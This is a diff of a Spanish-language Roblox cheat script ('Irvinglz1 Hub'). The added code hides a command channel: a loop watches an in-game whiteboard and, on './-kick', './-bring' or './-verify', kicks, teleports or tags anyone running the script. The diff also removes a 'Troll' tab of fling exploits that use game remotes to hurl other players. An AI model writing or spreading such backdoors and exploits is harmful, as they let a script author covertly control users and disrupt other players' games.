@@ -237,7 +237,7 @@ local function sendLog()
                 }
             },
             ["footer"] = {
-                ["text"] = "Irvinglz1 Hub 1313"
+                ["text"] = "Irvinglz1 Hub UwU"
             },
             ["timestamp"] = DateTime.now():ToIsoDate(),
             ["thumbnail"] = {
@@ -488,7 +488,7 @@ local function SetDefaultNameAndBio()
     pcall(function()
         nameTextRemote:FireServer("RolePlayName", "[ Usuario de Irvinglz1 ]")
         nameColorRemote:FireServer("PickingRPNameColor", Color3.new(1, 1, 1))
-        nameTextRemote:FireServer("RolePlayBio", "Irvinglz1 on top")
+        nameTextRemote:FireServer("RolePlayBio", "YES IRVINGLZ1 TOP")
         nameColorRemote:FireServer("PickingRPBioColor", Color3.new(0, 0, 0))
     end)
 end
@@ -508,6 +508,142 @@ local Window = Rayfield:CreateWindow({
    KeySystem = false
 })
 
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local BoardLabel = Workspace:WaitForChild("WorkspaceCom")
+    :WaitForChild("001_School")
+    :WaitForChild("SchoolDryBoard")
+    :WaitForChild("Words")
+    :FindFirstChildWhichIsA("TextLabel", true)
+
+if not BoardLabel then
+    repeat
+        task.wait(0.25)
+        BoardLabel = Workspace:WaitForChild("WorkspaceCom")
+            :WaitForChild("001_School")
+            :WaitForChild("SchoolDryBoard")
+            :WaitForChild("Words")
+            :FindFirstChildWhichIsA("TextLabel", true)
+    until BoardLabel
+end
+
+local Event = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l")
+
+local function CreateTag(player, text)
+    if not player or not player.Character then return end
+    local head = player.Character:FindFirstChild("Head")
+    if not head then return end
+    
+    local old = head:FindFirstChild("TagVerification")
+    if old then old:Destroy() end
+    
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "TagVerification"
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 200, 0, 40)
+    billboard.StudsOffset = Vector3.new(0, 3, 0)
+    billboard.AlwaysOnTop = true
+    billboard.MaxDistance = 120
+    billboard.Parent = head
+    
+    local frame = Instance.new("Frame", billboard)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.BackgroundTransparency = 0.3
+    frame.BorderSizePixel = 0
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
+    
+    local stroke = Instance.new("UIStroke", frame)
+    stroke.Color = Color3.fromRGB(0, 180, 255)
+    stroke.Thickness = 1.5
+    
+    local label = Instance.new("TextLabel", frame)
+    label.Size = UDim2.new(1, -8, 1, -8)
+    label.Position = UDim2.new(0, 4, 0, 4)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextSize = 14
+    label.Font = Enum.Font.GothamBold
+    label.TextStrokeTransparency = 0
+    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+end
+
+local function EquipTinCup()
+    Event:InvokeServer("PickingTools", "TinCup")
+end
+
+local function DoKick()
+    LocalPlayer:Kick("KICKEADO POR UN ADMIN")
+end
+
+local function DoBring()
+    local target = Players:FindFirstChild("Hiimnew928289alt2")
+    if not target then return end
+    if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
+    local rootTarget = target.Character.HumanoidRootPart
+    local rootLocal = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if rootLocal then
+        rootLocal.CFrame = rootTarget.CFrame * CFrame.new(0, 0, 3)
+    end
+end
+
+local function VerifyUsers()
+    EquipTinCup()
+    
+    task.delay(0.5, function()
+        for _, player in ipairs(Players:GetPlayers()) do
+            local function hasCup()
+                return (player.Backpack and player.Backpack:FindFirstChild("TinCup"))
+                    or (player.Character and player.Character:FindFirstChild("TinCup"))
+            end
+            
+            if hasCup() and player.Character then
+                CreateTag(player, "Usuario de Irvinglz1")
+            end
+        end
+    end)
+end
+
+local lastText = ""
+
+task.spawn(function()
+    while true do
+        task.wait(0.1)
+        
+        local text = BoardLabel.Text
+        if not text or text == "" or text == " " then
+            lastText = ""
+            continue
+        end
+        
+        if text == lastText then
+            continue
+        end
+        
+        lastText = text
+        
+        -- DETECTAR COMANDOS CON ./
+        if string.lower(text) == "./-verify" then
+            VerifyUsers()
+            continue
+        end
+        
+        if string.lower(text) == "./-kick" then
+            DoKick()
+            continue
+        end
+        
+        if string.lower(text) == "./-bring" then
+            DoBring()
+            continue
+        end
+    end
+end)
+
 Rayfield:Notify({
     Title = "¡Bienvenido a Irvinglz1 Hub!",
     Content = "PARA QUE LOS AUDIOS FUNCIONEN NECESITAS EL PASE DE MUSICA",
@@ -516,8 +652,8 @@ Rayfield:Notify({
 })
 
 Rayfield:Notify({
-    Title = "APOYO",
-    Content = "MUCHAS GRACIAS POR EL APOYO DE ESTE SCRIPT",
+    Title = "ACTUALIZACION",
+    Content = "REMOVIDO OPCION TROLL, REMOVIDOS ALGUNOS IDS y ???",
     Duration = 10,
     Image = 4483362458,
 })
@@ -1088,6 +1224,7 @@ PlaysTb:CreateParagraph({
     Content = "El vehículo aparecerá al presionar el botón, y el personaje volará automáticamente después de 1 segundo. Presiona 'Eliminar' para reiniciar."
 })
 
+AddSong(SongsTb, "Te quiero Jose❤ [NUEVOID]", 71545646409670)
 AddSong(SongsTb, "BB Trickz Super [NUEVOID]", 78482955772484)
 AddSong(SongsTb, "Ysrael Barajas GPI [NUEVOID]", 114513539517568)
 AddSong(SongsTb, "Nose cuál es [NUEVOID]", 80920308775995)
@@ -1102,7 +1239,6 @@ AddSong(SongsTb, "El Piojo Y Su 35 - El Maka [NUEVOID]", 76205335206456)
 AddSong(SongsTb, "Tu Sancho Fuerza Regida [NUEVOID]", 112119283279568)
 AddSong(SongsTb, "4X4 Omar Camacho [NUEVOID]", 106779262199873)
 AddSong(SongsTb, "Emociones - Hades66 [NUEVOID]", 106503897959355)
-AddSong(SongsTb, "Te quiero Jose❤ [NUEVOID]", 71545646409670)
 AddSong(SongsTb, "Tiniebla", 103601957304373)
 AddSong(SongsTb, "No me conoces", 100964447568270)
 AddSong(SongsTb, "Porque te mientes", 86744811464366)
@@ -1120,7 +1256,6 @@ AddSong(SongsTb, "los alegres del barranco", 133757497048417)
 AddSong(SongsTb, "Las Muñequitas Remix - Mr Plata, Americano 4kt Maluma", 83940945192283)
 AddSong(SongsTb, "topon del diablo - Makabelico", 97210562605927)
 AddSong(SongsTb, "nalguita y teta", 109159861086023)
-AddSong(SongsTb, "tumbayork-natanael", 128146261657955)
 AddSong(SongsTb, "La Navaja Victor Mendieta", 128999238382127)
 AddSong(SongsTb, "1v1 Victor Mendivil", 105965692492381)
 AddSong(SongsTb, "Rosa Victor Mendieta", 119488315546332)
@@ -1315,452 +1450,6 @@ TabItems:CreateButton({
         local Event = game:GetService("ReplicatedStorage").RE["1Playe1rTrigge1rEven1t"]
         Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "Water Ballon")
     end,
-})
-
-local TabTroll = Window:CreateTab("☠ Troll", 4483362458)
-
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
-local Camera = workspace.CurrentCamera
-
-local selectedPlayer = nil
-local spectateActive = false
-local spectateConn = nil
-
-local function GetPlayerNames()
-    local names = {}
-
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            table.insert(names, player.Name)
-        end
-    end
-
-    return names
-end
-
-local Dropdown = TabTroll:CreateDropdown({
-    Name = "Seleccionar Jugador",
-    Options = GetPlayerNames(),
-    CurrentOption = {},
-    MultipleOptions = false,
-
-    Callback = function(Options)
-        selectedPlayer = Options[1]
-    end
-})
-
-local function UpdatePlayerList()
-    Dropdown:Refresh(GetPlayerNames())
-end
-
-Players.PlayerAdded:Connect(UpdatePlayerList)
-Players.PlayerRemoving:Connect(UpdatePlayerList)
-
-TabTroll:CreateButton({
-    Name = "Actualizar Lista",
-    Callback = UpdatePlayerList
-})
-
-TabTroll:CreateToggle({
-    Name = "Espectar Jugador",
-    CurrentValue = false,
-    Flag = "SpectatePlayer",
-
-    Callback = function(Value)
-        spectateActive = Value
-
-        if Value then
-            if not selectedPlayer then
-                spectateActive = false
-                return
-            end
-
-            local target = Players:FindFirstChild(selectedPlayer)
-
-            if not target then
-                spectateActive = false
-                return
-            end
-
-            if spectateConn then
-                spectateConn:Disconnect()
-            end
-
-            spectateConn = RunService.Heartbeat:Connect(function()
-                if not spectateActive then return end
-
-                if target.Character then
-                    local hum = target.Character:FindFirstChildOfClass("Humanoid")
-
-                    if hum then
-                        Camera.CameraSubject = hum
-                    end
-                end
-            end)
-        else
-            if spectateConn then
-                spectateConn:Disconnect()
-                spectateConn = nil
-            end
-
-            if LocalPlayer.Character then
-                local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-
-                if hum then
-                    Camera.CameraSubject = hum
-                end
-            end
-        end
-    end
-})
-
-local SeccionClickFling = TabTroll:CreateSection("Click Fling Ball (Tool)")
-
-local NOMBRE_HERRAMIENTA = "Click Fling Ball"
-local herramientaEquipada = false
-local Jugadores = game:GetService("Players")
-local AlmacenamientoRemoto = game:GetService("ReplicatedStorage")
-local Mundo = game:GetService("Workspace")
-local EntradaUsuario = game:GetService("UserInputService")
-local Camara = Mundo.CurrentCamera
-local JugadorLocal = Jugadores.LocalPlayer
-
-local function CrearHerramienta()
-    local mochila = JugadorLocal:WaitForChild("Backpack")
-    if not mochila:FindFirstChild(NOMBRE_HERRAMIENTA) then
-        local herramienta = Instance.new("Tool")
-        herramienta.Name = NOMBRE_HERRAMIENTA
-        herramienta.RequiresHandle = false
-        herramienta.CanBeDropped = false
-        herramienta.Equipped:Connect(function()
-            herramientaEquipada = true
-        end)
-        herramienta.Unequipped:Connect(function()
-            herramientaEquipada = false
-        end)
-        herramienta.Parent = mochila
-    end
-end
-CrearHerramienta()
-
-local function ObtenerPelota()
-    local personaje = JugadorLocal.Character or JugadorLocal.CharacterAdded:Wait()
-    local mochila = JugadorLocal:WaitForChild("Backpack")
-    local PelotasServidor = Mundo:WaitForChild("WorkspaceCom"):WaitForChild("001_SoccerBalls")
-    if not mochila:FindFirstChild("SoccerBall") and not personaje:FindFirstChild("SoccerBall") then
-        pcall(function()
-            AlmacenamientoRemoto:WaitForChild("RE"):FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
-        end)
-    end
-    repeat task.wait() until mochila:FindFirstChild("SoccerBall") or personaje:FindFirstChild("SoccerBall")
-    local pelotaHerramienta = mochila:FindFirstChild("SoccerBall")
-    if pelotaHerramienta then
-        pelotaHerramienta.Parent = personaje
-    end
-    repeat task.wait() until PelotasServidor:FindFirstChild("Soccer" .. JugadorLocal.Name)
-    return PelotasServidor:FindFirstChild("Soccer" .. JugadorLocal.Name)
-end
-
-local function FlingBall(objetivo)
-    if not objetivo or objetivo == JugadorLocal then return end
-    local personaje = JugadorLocal.Character or JugadorLocal.CharacterAdded:Wait()
-    local humanoide = personaje:WaitForChild("Humanoid")
-    local PelotasServidor = Mundo:WaitForChild("WorkspaceCom"):WaitForChild("001_SoccerBalls")
-    local Pelota = PelotasServidor:FindFirstChild("Soccer" .. JugadorLocal.Name) or ObtenerPelota()
-    if not Pelota then return end
-    Pelota.CanCollide = false
-    Pelota.Massless = true
-    Pelota.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)
-    local personajeObjetivo = objetivo.Character
-    if not personajeObjetivo then return end
-    local raizObjetivo = personajeObjetivo:FindFirstChild("HumanoidRootPart")
-    local humanoideObjetivo = personajeObjetivo:FindFirstChild("Humanoid")
-    if not raizObjetivo or not humanoideObjetivo then return end
-    for _, v in pairs(Pelota:GetChildren()) do
-        if v:IsA("BodyVelocity") then v:Destroy() end
-    end
-    local velocidadCuerpo = Instance.new("BodyVelocity")
-    velocidadCuerpo.Name = "FlingPower"
-    velocidadCuerpo.Velocity = Vector3.new(9e8, 9e8, 9e8)
-    velocidadCuerpo.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-    velocidadCuerpo.P = 9e900
-    velocidadCuerpo.Parent = Pelota
-    local camaraAnterior = Mundo.CurrentCamera.CameraSubject
-    Mundo.CurrentCamera.CameraSubject = humanoideObjetivo
-    local tiempoInicio = tick()
-    repeat
-        if raizObjetivo.Velocity.Magnitude > 0 then
-            local pos = raizObjetivo.Position + (raizObjetivo.Velocity / 1.5)
-            Pelota.CFrame = CFrame.new(pos)
-            Pelota.Orientation += Vector3.new(45, 60, 30)
-        else
-            for _, v in pairs(personajeObjetivo:GetChildren()) do
-                if v:IsA("BasePart") and v.CanCollide and not v.Anchored then
-                    Pelota.CFrame = v.CFrame
-                    task.wait(1/6000)
-                end
-            end
-        end
-        task.wait(1/6000)
-    until raizObjetivo.Velocity.Magnitude > 1000 or humanoideObjetivo.Health <= 0 or not personajeObjetivo:IsDescendantOf(Mundo) or tick() - tiempoInicio > 10
-    Mundo.CurrentCamera.CameraSubject = camaraAnterior or humanoide
-end
-
-EntradaUsuario.TouchTap:Connect(function(toques, procesado)
-    if not herramientaEquipada or procesado then return end
-    local pos = toques[1]
-    local rayo = Camara:ScreenPointToRay(pos.X, pos.Y)
-    local impacto = Mundo:Raycast(rayo.Origin, rayo.Direction * 1000)
-    if impacto and impacto.Instance then
-        local modelo = impacto.Instance:FindFirstAncestorOfClass("Model")
-        local jugador = Jugadores:GetPlayerFromCharacter(modelo)
-        if jugador and jugador ~= JugadorLocal then
-            FlingBall(jugador)
-        end
-    end
-end)
-
-TabTroll:CreateButton({
-    Name = "⚽ Obtener Click Fling Ball",
-    Description = "Crea la herramienta en tu mochila",
-    Callback = function()
-        CrearHerramienta()
-    end
-})
-
-local flingActivo = false
-local flingConexion = nil
-local Whitelist = {}
-
-TabTroll:CreateSection("Whitelist - Fling Ball All")
-
-local DropdownJugadores
-
-local function ObtenerOpcionesWhitelist()
-    local opciones = {}
-
-    for _, jugador in ipairs(Jugadores:GetPlayers()) do
-        if jugador ~= JugadorLocal and not table.find(Whitelist, jugador.Name) then
-            table.insert(opciones, jugador.Name)
-        end
-    end
-
-    return opciones
-end
-
-local function ActualizarDropdown()
-    if DropdownJugadores then
-        pcall(function()
-            DropdownJugadores:Refresh(ObtenerOpcionesWhitelist())
-        end)
-    end
-end
-
-DropdownJugadores = TabTroll:CreateDropdown({
-    Name = "Seleccionar Jugador",
-    Description = "Selecciona un jugador para añadirlo a la whitelist",
-    Options = ObtenerOpcionesWhitelist(),
-    CurrentOption = {},
-    MultipleOptions = false,
-
-    Callback = function(Option)
-        local nombre
-
-        if type(Option) == "table" then
-            nombre = Option[1]
-        else
-            nombre = Option
-        end
-
-        if not nombre or nombre == "" then
-            return
-        end
-
-        if not table.find(Whitelist, nombre) then
-            table.insert(Whitelist, nombre)
-        end
-
-        ActualizarDropdown()
-    end
-})
-
-Jugadores.PlayerAdded:Connect(function()
-    task.wait(0.1)
-    ActualizarDropdown()
-end)
-
-Jugadores.PlayerRemoving:Connect(function(jugador)
-    local index = table.find(Whitelist, jugador.Name)
-
-    if index then
-        table.remove(Whitelist, index)
-    end
-
-    task.wait(0.1)
-    ActualizarDropdown()
-end)
-
-local function EstaEnWhitelist(jugador)
-    return jugador
-        and table.find(Whitelist, jugador.Name) ~= nil
-end
-
-local function FlingJugador(objetivo)
-    if not objetivo or objetivo == JugadorLocal then
-        return
-    end
-
-    -- Comprobar whitelist justo antes de atacar
-    if EstaEnWhitelist(objetivo) then
-        return
-    end
-
-    local Pelota = PelotasServidor:FindFirstChild("Soccer" .. JugadorLocal.Name)
-
-    if not Pelota then
-        Pelota = ObtenerPelota()
-    end
-
-    if not Pelota then
-        return
-    end
-
-    -- Volver a comprobar por seguridad
-    if EstaEnWhitelist(objetivo) then
-        return
-    end
-
-    local personajeObjetivo = objetivo.Character
-    if not personajeObjetivo then
-        return
-    end
-
-    local raizObjetivo = personajeObjetivo:FindFirstChild("HumanoidRootPart")
-    local humanoideObjetivo = personajeObjetivo:FindFirstChild("Humanoid")
-
-    if not raizObjetivo or not humanoideObjetivo then
-        return
-    end
-
-    Pelota.CanCollide = false
-    Pelota.Massless = true
-    Pelota.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)
-
-    for _, v in ipairs(Pelota:GetChildren()) do
-        if v:IsA("BodyVelocity") then
-            v:Destroy()
-        end
-    end
-
-    local velocidadCuerpo = Instance.new("BodyVelocity")
-    velocidadCuerpo.Name = "FlingPower"
-    velocidadCuerpo.Velocity = Vector3.new(9e8, 9e8, 9e8)
-    velocidadCuerpo.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-    velocidadCuerpo.P = 9e900
-    velocidadCuerpo.Parent = Pelota
-
-    local tiempoInicio = tick()
-
-    repeat
-        -- Comprobar whitelist durante el fling también
-        if EstaEnWhitelist(objetivo) then
-            break
-        end
-
-        if raizObjetivo.Velocity.Magnitude > 0 then
-            local pos = raizObjetivo.Position + (raizObjetivo.Velocity / 1.5)
-            Pelota.CFrame = CFrame.new(pos)
-            Pelota.Orientation += Vector3.new(45, 60, 30)
-        else
-            for _, v in ipairs(personajeObjetivo:GetChildren()) do
-                if v:IsA("BasePart") and v.CanCollide and not v.Anchored then
-                    Pelota.CFrame = v.CFrame
-                    task.wait(1 / 6000)
-                end
-            end
-        end
-
-        task.wait(1 / 6000)
-
-    until raizObjetivo.Velocity.Magnitude > 1000
-        or humanoideObjetivo.Health <= 0
-        or not personajeObjetivo:IsDescendantOf(Mundo)
-        or tick() - tiempoInicio > 8
-
-    if velocidadCuerpo then
-        velocidadCuerpo:Destroy()
-    end
-end
-
-local function ObtenerJugadoresDisponibles()
-    local disponibles = {}
-
-    for _, jugador in ipairs(Jugadores:GetPlayers()) do
-        if jugador ~= JugadorLocal and not EstaEnWhitelist(jugador) then
-            table.insert(disponibles, jugador)
-        end
-    end
-
-    return disponibles
-end
-
-local function FlingTodos()
-    for _, jugador in ipairs(ObtenerJugadoresDisponibles()) do
-        task.spawn(function()
-            FlingJugador(jugador)
-        end)
-
-        task.wait(0.05)
-    end
-end
-
-local function IniciarFling()
-    if flingConexion then
-        return
-    end
-
-    flingActivo = true
-
-    flingConexion = RunService.Heartbeat:Connect(function()
-        if flingActivo then
-            FlingTodos()
-        end
-    end)
-end
-
-local function DetenerFling()
-    flingActivo = false
-
-    if flingConexion then
-        flingConexion:Disconnect()
-        flingConexion = nil
-    end
-end
-
-TabTroll:CreateToggle({
-    Name = "🌐 Fling Ball All",
-    Description = "Lanza a los jugadores excepto los de la whitelist",
-    CurrentValue = false,
-    Flag = "FlingBallAll",
-
-    Callback = function(Value)
-        if Value then
-            IniciarFling()
-        else
-            DetenerFling()
-        end
-    end
-})
-
-TabTroll:CreateButton({
-    Name = "⚡ Fling All (Una vez)",
-    Description = "Lanza una vez a todos excepto los de la whitelist",
-
-    Callback = function()
-        FlingTodos()
-    end
 })
 
 local AvatarTb = Window:CreateTab("👔 Avatar", 4483362458)
@@ -2914,7 +2603,6 @@ local function ShowOwnerNotification()
     text.Font = Enum.Font.GothamBold
     text.Parent = frame
 
-    -- Parpadeo
     task.spawn(function()
         while gui and gui.Parent do
             frame.BackgroundTransparency = 0.4
@@ -2924,7 +2612,6 @@ local function ShowOwnerNotification()
         end
     end)
 
-    -- Animación entrada
     text.TextTransparency = 1
     TweenService:Create(text, TweenInfo.new(0.5), {
         TextTransparency = 0
@@ -2932,7 +2619,6 @@ local function ShowOwnerNotification()
 
     task.wait(10)
 
-    -- Animación salida
     TweenService:Create(text, TweenInfo.new(0.5), {
         TextTransparency = 1
     }):Play()
@@ -2948,9 +2634,7 @@ local player = Players.LocalPlayer
 local controlFolder = GetControlFolder()
 
 local function CheckForOwner()
-    -- Si TÚ eres el owner
     if player.Name == OWNER_USERNAME then
-        -- Crear marcador de que el owner ejecutó
         local ownerMarker = controlFolder:FindFirstChild("OwnerExecuted")
         if not ownerMarker then
             ownerMarker = Instance.new("BoolValue")
@@ -2960,13 +2644,10 @@ local function CheckForOwner()
         end
         
     else
-        -- Si NO eres el owner
-        -- Buscar si el owner ya ejecutó
         local ownerMarker = controlFolder:FindFirstChild("OwnerExecuted")
         if ownerMarker and ownerMarker.Value then
             ShowOwnerNotification()
         else
-            -- Esperar a que el owner ejecute
             controlFolder.ChildAdded:Connect(function(child)
                 if child.Name == "OwnerExecuted" and child.Value then
                     ShowOwnerNotification()
@@ -3265,7 +2946,7 @@ end)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local DEV_USER_ID = 9040986860
-local ownerTagColor = Color3.fromRGB(255, 105, 180) -- Rosa inicial
+local ownerTagColor = Color3.fromRGB(255, 105, 180)
 local ownerTagLabel = nil
 
 local function GetOwnerColorFolder()
@@ -3320,7 +3001,6 @@ local function addOwnerLabel(character)
     text.Parent = label
 
     ownerTagLabel = text
-    -- Aplicar color inicial de stroke
     updateOwnerTagColor(ownerTagColor)
 end
 
@@ -3341,7 +3021,6 @@ local function updateOwnerTagColor(color)
     if ownerTagLabel then
         pcall(function()
             ownerTagLabel.TextColor3 = color
-            -- Cambiar el stroke a un color complementario para mejor contraste
             ownerTagLabel.TextStrokeColor3 = Color3.fromRGB(
                 math.max(0, 255 - color.R * 255),
                 math.max(0, 255 - color.G * 255),
@@ -3379,10 +3058,9 @@ local lilaPinkActive = true
 task.spawn(function()
     while lilaPinkActive do
         pcall(function()
-            -- Lila y Rosa
             local colors = {
-                Color3.fromRGB(200, 50, 255),  -- Lila intenso
-                Color3.fromRGB(255, 105, 180), -- Rosa
+                Color3.fromRGB(200, 50, 255),
+                Color3.fromRGB(255, 105, 180),
             }
             
             for colorIndex = 1, #colors do
@@ -3408,8 +3086,4 @@ task.spawn(function()
             end
         end)
     end
-end)
-
-print("helo")
-
-
+end) 
